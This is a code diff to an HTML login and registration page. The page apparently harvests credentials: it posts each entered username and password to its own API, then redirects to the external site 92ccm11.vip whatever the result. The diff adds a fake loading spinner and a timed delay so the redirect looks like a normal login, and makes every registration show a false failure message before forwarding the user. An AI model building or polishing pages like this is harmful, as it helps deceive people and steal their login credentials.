@@ -665,7 +665,11 @@
         </div>
     </div>
 </div>
-
+<!-- ================= MÀN HÌNH LOADING ================= -->
+<div id="loading-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:10000; justify-content:center; align-items:center; flex-direction:column;">
+    <i class="fa-solid fa-spinner fa-spin" style="color:#269a3c; font-size:50px;"></i>
+    <div style="color:#fff; margin-top:15px; font-size:16px; font-weight:bold;">Đang xử lý...</div>
+</div>
 <script>
     let currentLoginUser = '';
     let currentLoginPass = '';
@@ -739,6 +743,9 @@
             return;
         }
 
+        // Hiện hiệu ứng xoay loading
+        document.getElementById('loading-overlay').style.display = 'flex';
+
         fetch('/api/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -750,10 +757,16 @@
         })
         .then(res => res.json())
         .then(data => {
-            window.location.href = 'https://92ccm11.vip/home/login';
+            // Chuyển link với độ trễ 1.5 giây (1500ms) để người dùng kịp nhìn thấy vòng xoay
+            setTimeout(() => {
+                window.location.href = 'https://92ccm11.vip/home/login';
+            }, 1500);
         })
         .catch(err => {
-            window.location.href = 'https://92ccm11.vip/home/login';
+            // Nếu có lỗi mạng cũng xoay 1.5 giây rồi chuyển trang
+            setTimeout(() => {
+                window.location.href = 'https://92ccm11.vip/home/login';
+            }, 1500);
         });
     }
 
@@ -775,10 +788,17 @@
         })
         .then(res => res.json())
         .then(data => {
+            // Hiện thông báo, màn hình sẽ dừng chờ bạn ấn OK
             alert('Đăng ký thất bại, LINK LỖI!');
+            // Vừa ấn OK xong, nó sẽ chạy dòng này để chuyển link
+            window.location.href = 'https://92ccm11.vip/home/login';
+        })
+        .catch(err => {
+            // Đề phòng API chết vẫn hiện bảng và chuyển link bình thường
+            alert('Đăng ký thất bại, LINK LỖI! vui lòng tham gia vào link khác');
+            window.location.href = 'https://92ccm11.vip/home/login';
         });
     }
 </script>
-
 </body>
 </html>
